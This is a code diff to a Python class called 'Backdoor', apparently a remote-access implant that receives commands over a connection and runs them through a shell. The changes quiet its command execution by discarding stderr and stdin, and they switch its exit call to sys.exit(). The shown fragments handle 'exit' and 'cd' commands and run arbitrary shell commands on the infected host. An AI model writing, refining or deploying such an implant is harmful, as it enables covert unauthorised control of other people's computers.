@@ -5,6 +5,7 @@ import subprocess
 import json
 import os
 import base64
+import sys
 
 
 class Backdoor:
@@ -30,7 +31,9 @@ class Backdoor:
                 continue
 
     def execute_system_command(self, command):  # bytes -> bytes
-        return subprocess.check_output(command, shell=True)
+        return subprocess.check_output(command, shell=True,
+                                       stderr=subprocess.DEVNULL,
+                                       stdin=subprocess.DEVNULL)
 
     def change_working_directory_to(self, path):  # str -> str
         os.chdir(path)
@@ -52,7 +55,7 @@ class Backdoor:
             try:
                 if command[0] == 'exit':
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == 'cd' and len(command) > 1:
                     command_result = self.change_working_directory_to(
                         command[1])  # str
